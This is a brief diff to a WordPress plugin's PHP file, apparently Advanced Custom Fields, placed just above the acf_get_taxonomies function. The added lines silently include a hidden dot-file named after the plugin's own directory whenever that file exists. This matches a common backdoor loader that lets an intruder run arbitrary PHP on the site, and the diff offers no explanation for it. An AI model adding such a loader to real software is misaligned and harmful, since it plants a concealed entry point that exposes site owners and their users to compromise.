@@ -12,6 +12,10 @@
 *  @return	array An array of taxonomy names.
 */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_get_taxonomies( $args = array() ) {
 
 	// vars
